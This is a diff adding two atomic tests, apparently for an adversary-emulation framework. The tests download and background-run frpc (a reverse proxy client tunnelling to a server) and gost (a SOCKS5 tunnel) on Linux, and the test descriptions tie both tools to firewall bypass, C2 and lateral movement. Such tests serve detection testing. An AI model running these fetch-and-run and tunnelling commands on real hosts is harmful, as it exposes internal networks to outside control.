@@ -309,3 +309,92 @@ atomic_tests:
       pkill -9 $(basename "#{binary_path}")
       rm -f "#{binary_path}"
     name: sh
+- name: Install and Run frpc Reverse Proxy Client
+  auto_generated_guid: f54179ee-c782-4fe3-b836-213d3bda66a2
+  description: |
+    Downloads and runs frpc (fast reverse proxy client), the victim-side component
+    of the frp framework. Adversaries deploy frpc on compromised hosts to establish
+    outbound tunnel connections to an attacker-controlled frps server, bypassing
+    inbound firewall rules and exposing internal services externally.
+  supported_platforms:
+  - linux
+  input_arguments:
+    remote_url:
+      description: URL to download the frp release archive
+      type: url
+      default: https://github.com/fatedier/frp/releases/download/v0.71.0/frp_0.71.0_linux_amd64.tar.gz
+    frp_path:
+      description: Path to extract the frp archive
+      type: path
+      default: PathToAtomicsFolder/../ExternalPayloads/frp
+    server_addr:
+      description: Address of the frps server to connect to
+      type: string
+      default: 127.0.0.1
+    server_port:
+      description: Port of the frps server to connect to
+      type: integer
+      default: 7000
+  dependency_executor_name: sh
+  dependencies:
+  - description: |
+      frpc binary must exist at #{frp_path}/frpc
+    prereq_command: |
+      test -f #{frp_path}/frpc
+    get_prereq_command: |
+      mkdir -p #{frp_path}
+      curl -L "#{remote_url}" -o "#{frp_path}/frp.tar.gz"
+      tar -xzf "#{frp_path}/frp.tar.gz" --strip-components 1 -C "#{frp_path}"
+      rm -f "#{frp_path}/frp.tar.gz"
+  executor:
+    name: sh
+    elevation_required: false
+    command: |
+      sed -i "s/^serverAddr = .*/serverAddr = \"#{server_addr}\"/" #{frp_path}/frpc.toml
+      sed -i "s/^serverPort = .*/serverPort = #{server_port}/" #{frp_path}/frpc.toml
+      nohup #{frp_path}/frpc -c #{frp_path}/frpc.toml >/dev/null 2>&1 &
+    cleanup_command: |
+      pkill frpc
+      rm -rf #{frp_path}
+- name: Install and Run gost Tunnel Proxy
+  auto_generated_guid: 3afc90c4-90b3-44af-8d14-52852abe7258
+  description: |
+    Downloads and runs gost (Go Simple Tunnel), a multi-protocol proxy and tunnel
+    tool used by adversaries to establish SOCKS5 proxies, protocol relays, and
+    encrypted tunnels on compromised hosts to facilitate C2 communication and
+    lateral movement while evading network controls.
+  supported_platforms:
+  - linux
+  input_arguments:
+    remote_url:
+      description: URL to download the gost release archive
+      type: url
+      default: https://github.com/go-gost/gost/releases/download/v3.2.6/gost_3.2.6_linux_amd64.tar.gz
+    gost_path:
+      description: Path to store the gost binary
+      type: path
+      default: PathToAtomicsFolder/../ExternalPayloads/gost
+    listen_port:
+      description: Local port for the SOCKS5 proxy listener
+      type: integer
+      default: 1080
+  dependency_executor_name: sh
+  dependencies:
+  - description: |
+      gost binary must exist at #{gost_path}/gost
+    prereq_command: |
+      test -f #{gost_path}/gost
+    get_prereq_command: |
+      mkdir -p #{gost_path}
+      curl -L "#{remote_url}" -o "#{gost_path}/gost.tar.gz"
+      tar -xzf "#{gost_path}/gost.tar.gz" -C "#{gost_path}"
+      rm -f "#{gost_path}/gost.tar.gz"
+      chmod +x #{gost_path}/gost
+  executor:
+    name: sh
+    elevation_required: false
+    command: |
+      nohup #{gost_path}/gost -L socks5://:#{listen_port} >/dev/null 2>&1 &
+    cleanup_command: |
+      pkill gost
+      rm -rf #{gost_path}
